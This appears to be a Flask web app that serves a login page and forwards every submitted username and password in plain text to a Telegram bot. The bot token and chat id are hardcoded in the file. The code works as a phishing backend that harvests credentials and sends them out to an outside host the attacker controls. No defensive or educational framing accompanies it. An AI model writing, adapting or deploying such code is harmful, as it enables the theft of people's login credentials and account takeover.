from flask import Flask, request, jsonify, send_from_directory
import requests

app = Flask(__name__)

@app.route('/')
def serve_html():
    return send_from_directory('', 'index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    send_message_to_telegram(username, password)
    return jsonify({'message': 'Login details sent to Telegram bot successfully!'})

def send_message_to_telegram(username, password):
    bot_token = "7321528038:AAFHDt1_oEAq1MvpIR6pa8HX5ytkKm5wAdU"
    chat_id = "5930670499"
    message = f"Login Attempt:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    response = requests.post(url, params=params)
    if response.ok:
        print("Message sent to Telegram bot successfully!")
    else:
        print("Failed to send message to Telegram bot.")

if __name__ == '__main__':
    app.run(debug=True)
